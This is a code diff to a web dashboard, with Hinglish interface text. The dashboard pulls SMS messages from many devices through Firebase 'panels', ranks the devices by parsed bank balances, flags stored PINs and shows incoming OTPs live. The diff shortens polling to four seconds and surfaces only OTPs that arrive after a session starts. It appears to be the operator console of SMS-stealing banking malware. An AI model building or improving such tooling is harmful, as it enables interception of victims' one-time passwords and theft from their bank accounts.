@@ -133,6 +133,7 @@
   .badge-pin-yes { background: rgba(0,230,118,0.15); color: var(--green); border: 1px solid rgba(0,230,118,0.4); font-size: 0.62rem; font-weight: 800; padding: 2px 8px; border-radius: 8px; }
   .badge-pin-no { background: rgba(90,106,133,0.2); color: var(--muted); border: 1px solid rgba(90,106,133,0.35); font-size: 0.62rem; font-weight: 800; padding: 2px 8px; border-radius: 8px; }
   .live-preview { font-size: 0.7rem; color: #ffb74d; margin-top: 2px; line-height: 1.35; }
+  .sms-card.live-flash { border-color: rgba(255,82,82,0.55); box-shadow: 0 0 0 1px rgba(255,82,82,0.25); }
   .pill.live-on { background: rgba(255,82,82,0.12); border-color: rgba(255,82,82,0.45); color: #ff8a80; }
   .fetch-progress {
     display: none; margin: 0 16px 10px; padding: 8px 12px;
@@ -551,8 +552,8 @@ let fetchSessionActive = false, fetchDoneVisible = false;
 const rowSigCache = new Map();
 const PANEL_BATCH = 40;
 const SMS_BATCH = 18;
-const LIVE_POLL_MS = 10000;
-const LIVE_DEVICES_PER_TICK = 72;
+const LIVE_POLL_MS = 4000;
+const LIVE_DEVICES_PER_TICK = 96;
 const HIGH_MIN = 50000;
 const HIGH_MAX = 9000000;
 const LOW_MIN = 2000;
@@ -569,6 +570,7 @@ let liveSmsOn = true;
 let livePollTimer = null;
 let livePollOffset = 0;
 let clientRefreshGen = 0;
+let liveSessionStart = 0;
 
 const DAY_FILTERS = [
   { days: 1, label: '1 din' },
@@ -861,7 +863,8 @@ function processBankMessages(data) {
 
     if (isCard) creditCardSms.push(item);
     else {
-      if (!txnAmount && !avlAmount) continue;
+      const txnWords = CREDIT_WORDS.test(text) || DEBIT_WORDS.test(text) || BANK_ACTION.test(text);
+      if (!txnAmount && !avlAmount && !txnWords) continue;
       bankSms.push(item);
     }
   }
@@ -914,25 +917,54 @@ function parseRawSmsList(data) {
   }).filter(Boolean).sort(sortByRecent);
 }
 
+function resetLiveBaselines(devices) {
+  liveSessionStart = Date.now();
+  for (const d of devices || allDevices) {
+    d._liveBaselineSet = false;
+    d._liveSmsKeys = null;
+    d.newLiveCount = 0;
+    d.liveSmsNew = [];
+    d.latestLivePreview = '';
+  }
+}
+
+function isLiveSpamOnly(text, sender) {
+  if (!text) return true;
+  if (isScamSms(text, sender)) return true;
+  return false;
+}
+
 async function pollDeviceLive(device) {
   if (!liveSmsOn || !device?.panelUrl) return;
   try {
     const data = await firebaseGet(device.panelUrl, device.panelKey, `messages/${device.id}`,
-      { orderBy: '"$key"', limitToLast: '15' }, 9000);
-    const list = parseRawSmsList(data);
-    const prev = device._liveSmsKeys || new Set();
+      { orderBy: '"$key"', limitToLast: '25' }, 8000);
+    const list = parseRawSmsList(data).filter(m => !isLiveSpamOnly(m.text, m.sender));
+    if (!device._liveBaselineSet) {
+      device._liveSmsKeys = new Set(list.map(m => m.key));
+      device._liveBaselineSet = true;
+      device.liveSms = list;
+      device.liveSmsNew = [];
+      return;
+    }
+    const prev = device._liveSmsKeys;
     const fresh = list.filter(m => !prev.has(m.key));
+    for (const m of fresh) prev.add(m.key);
     device.liveSms = list;
-    device._liveSmsKeys = new Set(list.map(m => m.key));
     if (fresh.length) {
-      device.newLiveCount = (device.newLiveCount || 0) + fresh.length;
+      device.liveSmsNew = [...(device.liveSmsNew || []), ...fresh]
+        .sort(sortByRecent)
+        .filter((m, i, arr) => arr.findIndex(x => x.key === m.key) === i)
+        .slice(0, 80);
+      device.newLiveCount = device.liveSmsNew.length;
       device.latestLivePreview = fresh[0].text.slice(0, 120);
-      if (modalIsOpen && openModalIdx === device._idx && (modalTab === 'live' || modalTab === 'all')) showModal(device, true);
+      device.lastLiveAt = Date.now();
+      if (modalIsOpen && openModalIdx === device._idx && modalTab === 'live') showModal(device, true);
       if (!modalIsOpen) {
         patchDeviceRow(device);
         reorderDeviceRowsThrottled();
       }
-      toast(`📩 New SMS · ${device.displayName || device.name}`);
+      toast(`📩 Abhi aaya · ${device.displayName || device.name}`);
     }
   } catch (_) {}
 }
@@ -1017,11 +1049,25 @@ function updateLiveToggleUi() {
   btn.textContent = liveSmsOn ? '🔴 Live SMS ON' : '⚪ Live SMS OFF';
 }
 
+function smsFetchWantAll(wantAll = false) {
+  return wantAll || globalSmsDays === 0;
+}
+
+function smsFetchLimit() {
+  if (globalSmsDays <= 1) return 900;
+  if (globalSmsDays <= 3) return 1500;
+  if (globalSmsDays <= 7) return 3000;
+  if (globalSmsDays <= 15) return 5500;
+  if (globalSmsDays <= 30) return 9000;
+  return 12000;
+}
+
 async function fetchAllDeviceMessages(panelUrl, panelKey, deviceId, wantAll = false, signal = null) {
   if (signal?.aborted) throw new DOMException('Aborted', 'AbortError');
-  const FAST = wantAll ? 0 : (currentSort === 'balance_boom' ? 4000 : 3500);
-  const extra = wantAll ? {} : { orderBy: '"$key"', limitToLast: String(FAST) };
-  const ms = wantAll ? 20000 : 10000;
+  const useAll = smsFetchWantAll(wantAll);
+  const lim = useAll ? 0 : smsFetchLimit();
+  const extra = useAll ? {} : { orderBy: '"$key"', limitToLast: String(lim) };
+  const ms = useAll ? 28000 : 14000;
   try {
     const data = await firebaseGet(panelUrl, panelKey, `messages/${deviceId}`, extra, ms, signal);
     const norm = normalizeMessagesData(data);
@@ -1265,7 +1311,8 @@ function parseDevices(data, panelUrl, panelKey, panelName) {
       maxBalance: 0, maxTxn: 0, sortAmount: 0, tierSkip: false,
       bankBalances: [], bankSms: [], creditCardSms: [],
       smsLoaded: false, smsLoading: false, bankSmsCount: 0, creditCardCount: 0, totalRawSms: 0, fullSmsLoaded: false,
-      liveSms: [], newLiveCount: 0, latestLivePreview: '', _liveSmsKeys: null
+      liveSms: [], liveSmsNew: [], newLiveCount: 0, latestLivePreview: '', _liveSmsKeys: null,
+      bankSmsAll: [], lastLiveAt: 0
     };
   }).filter(Boolean);
 }
@@ -1279,14 +1326,18 @@ async function loadDeviceSms(device, wantAll = false, signal = null) {
     const data = await fetchAllDeviceMessages(device.panelUrl, device.panelKey, device.id, wantAll, signal);
     device.totalRawSms = data ? Object.keys(data).length : 0;
     const r = processBankMessages(data);
-    device.bankSms = r.bankSms;
-    device.creditCardSms = r.creditCardSms;
-    device.bankBalances = r.bankBalances;
-    device.maxBalance = r.maxBalance;
-    device.maxTxn = r.maxTxn || 0;
-    device.sortAmount = r.maxBalance || r.maxTxn || 0;
-    device.bankSmsCount = r.bankSmsCount;
-    device.creditCardCount = r.creditCardCount;
+    device.bankSmsAll = r.bankSms;
+    const bankInDays = globalSmsDays ? filterSmsByDays(r.bankSms, globalSmsDays) : r.bankSms;
+    const ccInDays = globalSmsDays ? filterSmsByDays(r.creditCardSms, globalSmsDays) : r.creditCardSms;
+    device.bankSms = bankInDays;
+    device.creditCardSms = ccInDays;
+    device.bankBalances = bankInDays.filter(m => m.avlAmount > 0).sort(sortByRecent);
+    const dayBal = getLatestBalance(bankInDays);
+    device.maxBalance = dayBal || bankInDays.reduce((m, x) => Math.max(m, x.txnAmount || 0), 0);
+    device.maxTxn = bankInDays.reduce((m, x) => Math.max(m, x.txnAmount || 0), 0);
+    device.sortAmount = device.maxBalance || device.maxTxn || 0;
+    device.bankSmsCount = bankInDays.length;
+    device.creditCardCount = ccInDays.length;
     device.smsLoaded = true;
     applyTierAfterLoad(device);
   } catch (e) {
@@ -1563,7 +1614,7 @@ function fillSmsQueueWave() {
     if (countInflightSms() >= maxInflight) break;
     if (smsQueue.some(q => q.device === d)) continue;
     const pri = (d.status ? 10 : 4) + (hasPin(d) ? 5 : 0);
-    queueSms(d, pri, false);
+    queueSms(d, pri, globalSmsDays === 0, false);
     added++;
   }
   return added;
@@ -1696,6 +1747,8 @@ function startSmsFetch() {
     setStatus('Is filter mein koi device nahi', 'err');
     return;
   }
+  resetLiveBaselines(pool);
+  if (liveSmsOn) startLivePolling();
   smsFetchPaused = false;
   smsFetchActive = true;
   hideFetchDoneBar();
@@ -1948,6 +2001,7 @@ async function fetchAllPanels(silent = false) {
   bulkSmsFetch = smsRunning || smsQueue.length > 0;
   btn.disabled = false;
   btn.innerHTML = '⚡ Fetch Live';
+  resetLiveBaselines(allDevices);
   setStatus(`✅ ${panels.length} panels · ${allDevices.length} devices · Filter + SMS days → ▶ Start Phase Fetch`, 'ok');
   updateFilterBar();
   updateFetchControlBtns();
@@ -2335,7 +2389,8 @@ function openDev(idx) {
 function getModalSmsList(d) {
   let list;
   if (modalTab === 'live') {
-    list = [...(d.liveSms || [])];
+    list = [...(d.liveSmsNew || [])];
+    if (!list.length) list = [...(d.liveSms || [])].slice(0, 20);
   } else if (modalTab === 'balance') {
     list = (d.bankSms || []).filter(m => m.avlAmount > 0);
   } else {
@@ -2356,10 +2411,10 @@ function buildModalTabs(d) {
   const full = [...(d.bankSms || []), ...(d.creditCardSms || [])];
   const filtered = filterSmsByDays(full, modalDays);
   const balN = filterSmsByDays((d.bankSms || []).filter(m => m.avlAmount > 0), modalDays).length;
-  const liveN = (d.liveSms || []).length;
+  const liveN = (d.liveSmsNew || []).length;
   return `<div class="modal-tabs" id="modalTabs">
     <button type="button" class="modal-tab ${modalTab === 'all' ? 'on' : ''}" data-mtab="all">🏦 Bank (${filtered.length})</button>
-    <button type="button" class="modal-tab live ${modalTab === 'live' ? 'on' : ''}" data-mtab="live">📩 Live (${liveN})</button>
+    <button type="button" class="modal-tab live ${modalTab === 'live' ? 'on' : ''}" data-mtab="live">📩 Live new (${liveN})</button>
     <button type="button" class="modal-tab bal ${modalTab === 'balance' ? 'on' : ''}" data-mtab="balance">💰 Balance (${balN})</button>
   </div>`;
 }
@@ -2372,7 +2427,7 @@ function buildModalHtml(d) {
 
   if (!list.length) {
     const emptyMsg = modalTab === 'live'
-      ? 'Live SMS abhi nahi — thodi der wait karo (OTP/SMS yahan dikhega)'
+      ? 'Naya SMS abhi nahi — Fetch/Live ON rakho, OTP turant yahan aayega (purana OTP ignore)'
       : modalTab === 'balance'
         ? `${dayLabel} mein koi balance SMS nahi`
         : `${dayLabel} mein koi bank SMS nahi`;
@@ -2381,16 +2436,26 @@ function buildModalHtml(d) {
   }
 
   const smsList = list;
-  const title = modalTab === 'live' ? '📩 LIVE SMS (OTP + sab)' : modalTab === 'balance' ? `💰 BALANCE · ${dayLabel}` : `🏦 BANK SMS · ${dayLabel}`;
+  const title = modalTab === 'live' ? '📩 LIVE — session ke baad naye SMS (OTP)' : modalTab === 'balance' ? `💰 BALANCE · ${dayLabel}` : `🏦 BANK · credit/debit/receive · ${dayLabel}`;
   let html = (modalTab === 'live' ? '' : dayRow) + tabs + `<div class="sec-title">${title} · ${smsList.length} SMS · RECENT UPAR</div>`;
 
   for (let i = 0; i < smsList.length; i++) {
     const m = smsList[i];
+    const liveNew = modalTab === 'live' || (d.liveSmsNew?.some(x => x.key === m.key));
+    if (modalTab === 'live') {
+      const otp = /\b(otp|one[\s-]?time|verification)\b/i.test(m.text);
+      html += `<div class="sms-card live-flash">
+        <div class="sms-type other">${otp ? 'OTP' : 'NEW SMS'} · 🆕</div>
+        <div class="sms-body">${esc(m.text)}</div>
+        <div class="sms-meta">${esc(m.sender)} · ${esc(m.time || '')}</div>
+      </div>`;
+      continue;
+    }
     const showAmt = m.avlAmount || m.txnAmount || m.sortAmount;
     const cls = m.isCard ? 'card-sms' : 'avl';
     const typeCls = m.isCard ? 'card' : (m.avlAmount > 0 ? 'avl' : (/debited?|sent|paid/i.test(m.text) ? 'deb' : 'cred'));
     const amtCls = m.isCard ? '' : (m.avlAmount > 0 ? 'gold' : (/debited?|sent|paid/i.test(m.text) ? 'red' : 'green'));
-    html += `<div class="sms-card ${cls}">
+    html += `<div class="sms-card ${cls}${liveNew ? ' live-flash' : ''}">
       <div class="sms-type ${typeCls}">${smsLabel(m)}</div>
       ${showAmt ? `<div class="sms-amt ${amtCls || 'gold'}">${fmtBal(showAmt) || '—'}</div>` : ''}
       <div class="sms-body">${esc(m.text)}</div>
